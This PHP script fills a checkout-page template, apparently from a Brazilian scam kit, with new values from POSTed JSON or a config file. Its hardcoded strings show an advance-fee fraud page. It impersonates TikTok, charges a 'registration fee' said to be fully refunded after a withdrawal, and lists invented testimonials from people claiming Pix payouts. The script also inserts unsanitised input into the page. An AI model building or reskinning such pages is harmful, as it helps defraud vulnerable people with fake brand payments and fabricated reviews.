<?php
// Preview dinâmico do checkout
header('Content-Type: text/html; charset=utf-8');

// Receber dados via POST ou usar padrão
$data = json_decode(file_get_contents('php://input'), true);

if (!$data) {
    $data = json_decode(file_get_contents('../config.json'), true);
}

// Carregar HTML original
$html = file_get_contents('../index.html');

// Substituir valores
$price = number_format($data['product']['price'], 2, '.', '');
$priceFormatted = number_format($data['product']['price'], 2, ',', '');

$replacements = [
    'Taxa de Cadastro - Essa taxa será reembolsada 100% após o saque' => $data['product']['name'] . ' - ' . $data['product']['description'],
    'Taxa de Cadastro' => $data['product']['name'],
    'Essa taxa será reembolsada 100% após o saque' => $data['product']['description'],
    '24.56' => $price,
    '24,56' => $priceFormatted,
    'https://cdn.optimuspay.io/products/uploads/019c3e60-2266-71ae-9908-a0a466a82fd1.png' => $data['product']['image'],
    'Tik Tok' => $data['store']['name'],
    './img_6988cc48b4e0b7.png' => $data['store']['logo'],
    '27.415.911/0001-36' => $data['store']['cnpj'],
    'tiktokpay@contato.com' => $data['store']['email'],
    'tiktokshop @contato.com' => $data['store']['email'],
    
    // Depoimentos
    'TikTok Brasil' => $data['testimonials'][0]['name'],
    '+ de 287.983 Recompensas foram enviadas.' => $data['testimonials'][0]['text'],
    'https://cdn.optimuspay.io/stores/6966/theme/img_6988ceb3d04ca9.16287872.webp' => $data['testimonials'][0]['image'],
    
    'Luana Silva' => $data['testimonials'][1]['name'],
    'Consegui sacar mais de 2 mil reais e paguei o meu aluguel, tiktok sempre salvando a gente quando mais precisamos, obrigado.' => $data['testimonials'][1]['text'],
    'https://cdn.optimuspay.io/stores/6966/theme/img_696da91fc806b2.89369199.webp' => $data['testimonials'][1]['image'],
    
    'Fernando Oliveira' => $data['testimonials'][2]['name'],
    'obrigado tiktok, fiz o passo a passo certinho e o pix caiiu na minha conta.' => $data['testimonials'][2]['text'],
    'https://cdn.optimuspay.io/stores/6966/theme/img_696da9203b9d41.47431713.webp' => $data['testimonials'][2]['image'],
];

foreach ($replacements as $search => $replace) {
    $html = str_replace($search, $replace, $html);
}

// Corrigir caminhos dos arquivos CSS e imagens para a raiz
$html = preg_replace('/href="\.\/([a-j]\.css)"/', 'href="../$1"', $html);
$html = str_replace('src="./img_6988cc48b4e0b7.png"', 'src="../img_6988cc48b4e0b7.png"', $html);
$html = str_replace('src="./loading-payment.gif"', 'src="../loading-payment.gif"', $html);

echo $html;
?>
